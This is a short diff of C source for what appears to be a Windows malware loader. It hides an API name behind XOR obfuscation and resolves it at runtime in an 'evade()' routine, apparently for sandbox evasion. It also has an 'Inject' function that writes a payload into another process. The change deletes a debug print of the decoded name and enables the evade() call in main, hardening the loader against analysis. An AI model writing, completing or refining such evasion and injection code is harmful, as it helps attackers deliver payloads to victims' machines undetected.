@@ -72,7 +72,6 @@ void evade(){
 
 	char pNuma[] = {0x11,0x0c,0x06,0x3a,0x10,0x16,0x3a,0x24,0x1e,0x1f,0x06,0x0c,0x2b,0x36,0x3b,0x18,0x0f,0x04,0x00};
 	XOR((char *) pNuma, sizeof(pNuma) -1, key, strlen(key));
-	printf("%s\n", pNuma);
 
 	exNuma = GetProcAddress(GetModuleHandle("kernel32.dll"), pNuma);
 
@@ -126,7 +125,7 @@ int Inject(HANDLE hProc, unsigned char * payload, unsigned int lengthyBoi){
 }
 
 int main(void) {
-	// evade();
+	evade();
 
 	void * exec_mem;
 	BOOL rv;
